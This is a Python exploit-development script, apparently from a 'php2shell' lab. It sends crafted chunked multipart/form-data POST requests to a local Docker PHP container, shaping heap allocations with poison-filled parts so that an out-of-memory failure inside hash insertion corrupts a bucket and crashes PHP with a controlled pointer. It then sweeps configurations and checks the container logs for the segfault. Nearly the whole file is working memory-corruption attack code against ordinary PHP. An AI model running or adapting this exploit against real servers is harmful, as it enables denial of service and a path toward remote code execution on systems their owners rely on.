#!/usr/bin/env python3
"""php2shell lab, oom19: kill sweep — drain budget leads x V, auto-calibrated.

Mechanism chain (all measured this session):
  - wall = memory_limit; position drifts per Docker VM generation (oom16-18)
  - key run: value 1152 (V=1024) never served by freed-param donation (1016,
    wrong size class) -> net drain ~136B/part -> wall arrives mid-run when
    lead (bytes left at key-run start) <= drain budget (~136*400 = 54400)
  - at the wall, which alloc dies is dice: value (1152) vs key (328)
    -> gate alloc<=360 = key death inside add_to_hash = malformed bucket
    -> teardown dtor -> SIGSEGV 0x0808080808080808

Protocol: per boot ONE config (decorrelate drift), V ladder then 2048 arm.
Hit protocol: docker logs segfault grep, print evidence, stop.
"""
import re
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

KEYRUN = 400

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int, V: int) -> list:
    ps = [part(b"n0", POISON * (256 * 1024)), part(b"n0", POISON * (256 * 1024))]
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 475 * UNIT + rem - 9 * UNIT - 2 * (256 * 1024)
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(KEYRUN):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=120)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "120"],
                       capture_output=True, text=True)
    hits = [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]
    return hits

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)
    configs = [(v, lead) for v in (1024, 2048) for lead in (50000, 40000, 30000, 20000, 15000)]
    boots_per_cfg = 2
    total = fatal_ct = 0
    for v, lead in configs:
        for b in range(boots_per_cfg):
            restart()
            fatal, text = send(port, build(lead, v))
            a = alloc_n(text) if fatal else None
            total += 1
            tag = ""
            if fatal:
                fatal_ct += 1
                if a is not None and a <= 360:
                    tag = "  *** KEY DEATH — SEGFAULT CHECK ***"
            log(f"V={v} lead={lead} boot{b}: fatal={fatal} alloc={a}{tag}")
            if tag:
                time.sleep(1.5)
                hits = segcheck()
                for h in hits:
                    log("SEGV: " + h)
                if hits:
                    log("*** SEGFAULT REPRODUCED — chain complete ***")
                    return
    log(f"== sweep done: {total} boots, {fatal_ct} fatals ==")

if __name__ == "__main__":
    main()
